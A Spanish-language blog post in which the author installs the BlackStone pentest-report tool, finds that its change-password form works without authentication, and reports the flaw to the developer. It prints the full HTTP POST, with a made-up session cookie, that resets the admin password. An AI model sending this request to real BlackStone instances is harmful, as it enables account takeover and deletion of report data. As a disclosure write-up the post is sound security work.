---
title: Bugbounty BlackStone
date: 2025-04-1 00:00:00 +0200
categories: [ciberseguridad, software]
tags: [bugbounty, blackstone, explotacionweb]     
image:
    path: https://user-images.githubusercontent.com/55983491/182504746-26c636f4-fe4f-410d-9898-e51f4ae35e6d.png
    alt: Blackstone
---

Antes de nada decir que fue mi propia curiosidad que me llevó a probar esta herramienta
[https://github.com/micro-joan/BlackStone](https://github.com/micro-joan/BlackStone), mis felicitaciones al autor Micro Joan, 
me parece que tiene una buena orientación a lo que el objetivo de esta herramienta. Según la propia información sería lo siguiente:
>El proyecto BlackStone o “BlackStone Project” es una herramienta creada con el fin de automatizar el trabajo de redacción y envío de informes sobre auditorías de hacking ético o pentesting.

Así que me dije, manos a la obra vamos a instalarlo.
Como el proyecto no parece y de hecho no fue difícil instalarlo a mano con Mariadb + php-fpm8.2 + nginx.
Dejo aquí la config por si alguien lo quiere probar, yo lo hice en Debian:

```
server {
	listen 8084 default_server;
	listen [::]:8084 default_server;

	root /var/www/BlackStone/;
	index index.html index.htm index.nginx-debian.html;
	server_name _;
	location / {
		try_files  / =404;
	}

	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/php8.2-fpm.sock;
	}

}
```

Bueno hay que crear la base de datos y ponerle una password al usuario para dicha base datos y
luego importamos la base de datos, damos por sentado que cambiarás la password no uses 'blackstone' (solo es para el ejemplo): 

```
MariaDB [(none)]> 
create database blackstone;
CREATE USER 'blackstone'@'localhost' IDENTIFIED BY 'blackstone';
GRANT PRIVILEGE ON blackstone.* TO 'blackstone'@'localhost';
MariaDB [(none)]> source /home/pablo/Descargas/blackstone.sql
```
Este usuario y password son los que vas a agregar a conexion.php
```
<?php
$host = "localhost";
$user = "blackstone";
$pass = "blackstone";
$basedatos = "blackstone";
$conexion = mysqli_connect($host, $user, $pass, $basedatos)
or die("Error al conectar a la base de datos");
// UTF-8 conjunto de caracteres por defecto para conexión MySQL
mysqli_query ($conexion, "SET NAMES 'utf8'");
?>
```
Vale ahora ya lo tengo corriendo, la password por defecto de la web es blackstone:blackstone
Abro la web, me logeo con las credenciales por defecto, y repaso los menús. 
Veo que tiene opciones para crear reportes, manejo de vulnerabilidades, una calculadora NIST , gestión de clientes. Estupendo
esta herramienta promete.

![blackstone.png](/assets/img/postsimgs/blackstone.png)
Aquí es donde se tensa, llego a parte de settings y veo que hay una opción para cambiar las password __Change password__.
Llamó mi atención que el formulario solo tiene un campo. Con la de contraseñas que he cambiado y hacía tiempo que no me encontraba 
un cambio de contraseña así, tan simple, las alarmas saltaron en mi cabeza. 
Me hizo pensar en que podía intentar jugar y ver si el cambio de password era susceptible de realizarse por la falta de lo que
yo entendía un control fundamental. Que el cambio de contraseña requiera algún control de autenticación, sea a través del cookies de sesión
u otros métodos. 

Por mi parte con Zap Proxy [Hacktools#web-pentest-frameworks](../hacktools#web-pentest-frameworks) capturé el POST que se hace al 
enviar la password y repliqué el mismo para ver que efectivamente podía cambiar la password incluso inventándome la cookie 

Ahora modifico el POST para alterar la password a **hackedpassword** y me invento una cookie de sesión __Cookie: PHPSESSID=dsfjsdlfsidfjjsdfsdfsd__
y se lo traga, se cambia la password y con ella puedo logearme. Para asegurarme de que no sufría una alucinación, mejor dicho un falso positivo 
y de que no me equivoco, cambio la clave sin apuntala y escribo una secuencia aleatoria. Deslogeo y vuelvo a intentar logearme pero no se la 
contraseña, así que no puedo. Ahora lanzo el POST desde ZAP y compruebo que no me equivoco,
se podría cambiar la clave sin nisiquiera tener que tener session de PHP.


```
POST /editar_perfil.php HTTP/1.1
Host: 192.168.2.125:8084
Content-Length: 243
Cache-Control: max-age=0
Accept-Language: es-ES,es;q=0.9
Origin: http://192.168.2.125:8084
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZANqX3u0BYVWXBym
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.2.125:8084/editar_perfil.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=dsfjsdlfsidfjjsdfsdfsd
Connection: keep-alive

------WebKitFormBoundaryZANqX3u0BYVWXBym
Content-Disposition: form-data; name="pass"

hackedpassword
------WebKitFormBoundaryZANqX3u0BYVWXBym
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryZANqX3u0BYVWXBym--
```

Conozco algún otro generador de informes como Dradis, pero me gusta mucho este y me gustaría usarlo en el futuro así que he optado por la opción de abrir un issue en proyecto de github. Estoy seguro que Micro Joan entusiasta de la programación y seguridad ofensiva, en pocas líneas es capaz de resolver esta vulnerabilidad, o al menos podría rebatirme que estoy equivocado, pero si no lo estoy, creo de alta criticidad pues un actor malicioso podría cambiar la contraseña de BlackStone y borrar todos los informes de la base de datos.

Otra cosa que no me convence en que las credencias van en el fichero conexion.php, supongo que es mi manía de no mezclar código y credenciales
meter esos datos en un archivo aparte creo que sería más acertado, si bien no son accesibles por medios comunes. 
Bueno he abierto el issue y creo que con esto cumplo con mi parte, no creo que este bugbounty tenga ninguna recompensa más allá de que el 
la vulnerabilidad sea resuelta y poder usar esta aplicación en el futuro, eso sí, con más seguridad. 
[https://github.com/micro-joan/BlackStone/issues/16](https://github.com/micro-joan/BlackStone/issues/16)

He contacado con Micro Joan por Linkedin y le he comentado la vulnerabilidad, aunque sea ara evitar un ataque de los de "por encima del hombro". 
Me ha contestado y me ha dicho que cuando tenga un hueco se pondrá con ello. 
Recordemos que muchas herramientas son gratuitas y creadas de forma altruista por gente que no sabemos si disponen del tiempo para regalarnos al resto su código. 

Voy a esperar unos días hasta ver si se solucionan este problemilla y espero que BlackStone tenga un futuro en el mundo de las herramientas de 
ciberseguridad.

**El logo y la imagen del software BlackStone han sido obtenidos del proyecto original https://github.com/micro-joan/BlackStone y su autor Micro Joan.**




